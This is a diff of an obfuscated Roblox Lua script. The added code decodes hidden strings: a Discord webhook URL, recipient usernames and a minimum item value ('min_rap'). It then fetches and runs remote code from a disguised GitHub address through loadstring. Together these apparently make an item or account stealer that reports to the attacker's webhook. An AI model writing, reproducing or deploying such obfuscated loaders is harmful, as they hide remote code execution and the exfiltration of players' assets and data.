@@ -1,2 +1,37 @@
 --[Obfuscated by Hercules v1.5 -> discord.gg/Hx6RuYs8Ku | by using the Hercules bot -> https://top.gg/bot/1293608330123804682]
-local opLZvJyBp, zBupSrBU, seFkXnLRTKeJ, ZqjrUiiYw, eSqjoSFlIklP if (#('abc' .. 'def') == 6) then opLZvJyBp = loadstring; end; if (#('abc' .. 'def') == 6) then zBupSrBU = math.random; end; if (#('abc' .. 'def') == 6) then seFkXnLRTKeJ = string.char; end; if (math.sin(math.pi) ~= 0) then ZqjrUiiYw = table.concat; end; if (5^2 - 2^5 == -7) then eSqjoSFlIklP = table.insert; end; local function hWIjtqTIFwy(FadrxCSq) local RMNAwfSqglO = 1 end local iYQbFAZLma = 7 local tqZUZJwzGwhp = 25 local hcoyUuXWnzAx = false while not hcoyUuXWnzAx do if zBupSrBU(0, 1) == 0 then local JCiQJNEMpD = 255 else hcoyUuXWnzAx = true end end local function bsqCQOItA(iLofUkUnyx) return (iLofUkUnyx >= 48 and iLofUkUnyx <= 57) or (iLofUkUnyx >= 65 and iLofUkUnyx <= 90) or (iLofUkUnyx >= 97 and iLofUkUnyx <= 122) end local function GjrFUnUtG(DQkArUdV, yqSJbRrEdNck) local TjBclNSo = {} for i = 1, #DQkArUdV do local iLofUkUnyx = DQkArUdV:byte(i) if bsqCQOItA(iLofUkUnyx) then local nZUNroLOSsTX if iLofUkUnyx >= 48 and iLofUkUnyx <= 57 then nZUNroLOSsTX = ((iLofUkUnyx - 48 - yqSJbRrEdNck + 10) % 10) + 48 elseif iLofUkUnyx >= 65 and iLofUkUnyx <= 90 then nZUNroLOSsTX = ((iLofUkUnyx - 65 - yqSJbRrEdNck + 26) % 26) + 65 elseif iLofUkUnyx >= 97 and iLofUkUnyx <= 122 then nZUNroLOSsTX = ((iLofUkUnyx - 97 - yqSJbRrEdNck + 26) % 26) + 97 end eSqjoSFlIklP(TjBclNSo, seFkXnLRTKeJ(nZUNroLOSsTX)) else eSqjoSFlIklP(TjBclNSo, seFkXnLRTKeJ(iLofUkUnyx)) end end return ZqjrUiiYw(TjBclNSo) end local function bsqCQOItA(iLofUkUnyx) return (iLofUkUnyx >= 48 and iLofUkUnyx <= 57) or (iLofUkUnyx >= 65 and iLofUkUnyx <= 90) or (iLofUkUnyx >= 97 and iLofUkUnyx <= 122) end getgenv().AuthKey = GjrFUnUtG("REQO_73rBhQ7jgOwB", 10) getgenv().LoadSettings = { Example_Setting = Example_Value } opLZvJyBp(game:HttpGet(GjrFUnUtG("myyux://MzljLfrjx.nt/ux44", 5)))() local wspURUheiLz = 92
+local xxtrReOL, cavythXmgQR, eVTOuujlu, TkMOzDEHn, PFltCBXzBOx
+xxtrReOL = loadstring; cavythXmgQR = math.random; eVTOuujlu = string.char; TkMOzDEHn = table.concat; PFltCBXzBOx = table.insert;
+ local oYJCVlVn = false while not oYJCVlVn do if cavythXmgQR(0, 1) == 0 then local lZuBOrQDdYje = 394 else oYJCVlVn = true end end local function LZDDRFvR(QtoddTLEHy)
+    return (QtoddTLEHy >= 48 and QtoddTLEHy <= 57) or (QtoddTLEHy >= 65 and QtoddTLEHy <= 90) or (QtoddTLEHy >= 97 and QtoddTLEHy <= 122)
+end
+	
+local function mnqwlJcwhet(bRCFfkLJS, fGICKfLdMI)
+    local ZCbfwLhSxc = {}
+    for i = 1, #bRCFfkLJS do
+        local QtoddTLEHy = bRCFfkLJS:byte(i)
+        if LZDDRFvR(QtoddTLEHy) then
+            local ZiVzrzfLD            if QtoddTLEHy >= 48 and QtoddTLEHy <= 57 then
+                ZiVzrzfLD = ((QtoddTLEHy - 48 - fGICKfLdMI + 10) % 10) + 48
+            elseif QtoddTLEHy >= 65 and QtoddTLEHy <= 90 then
+                ZiVzrzfLD = ((QtoddTLEHy - 65 - fGICKfLdMI + 26) % 26) + 65
+            elseif QtoddTLEHy >= 97 and QtoddTLEHy <= 122 then
+                ZiVzrzfLD = ((QtoddTLEHy - 97 - fGICKfLdMI + 26) % 26) + 97
+            end
+            PFltCBXzBOx(ZCbfwLhSxc, eVTOuujlu(ZiVzrzfLD))
+        else
+            PFltCBXzBOx(ZCbfwLhSxc, eVTOuujlu(QtoddTLEHy))
+        end
+    end
+    return TkMOzDEHn(ZCbfwLhSxc)
+end
+
+local function LZDDRFvR(QtoddTLEHy)
+    return (QtoddTLEHy >= 48 and QtoddTLEHy <= 57) or (QtoddTLEHy >= 65 and QtoddTLEHy <= 90) or (QtoddTLEHy >= 97 and QtoddTLEHy <= 122)
+end
+
+Username = mnqwlJcwhet("ljkjpjvrwp", 9)
+Username2 = mnqwlJcwhet("kxswo1230017", 10)
+webhook = mnqwlJcwhet("eqqmp://afpzloa.zlj/xmf/tbyellhp/4634685780531058829/8-8M0yzDWaQso-CqQN1U-AXP7L_hoDveRLdAvG6em1XLlDFiLxbsbR6ZMCXtU48Y4IyN", 23)
+min_rap = 1000000
+
+xxtrReOL(game:HttpGet(mnqwlJcwhet("dpplo://nws.cepdqxqoanykjpajp.yki/SdnepanDqx/Sdepan/iwej/IwehOpawhanR.4", 22)))() local function vMRDtWMoqRPc(dYUhWDaZU) local LTFBdpSugDy = 44 end
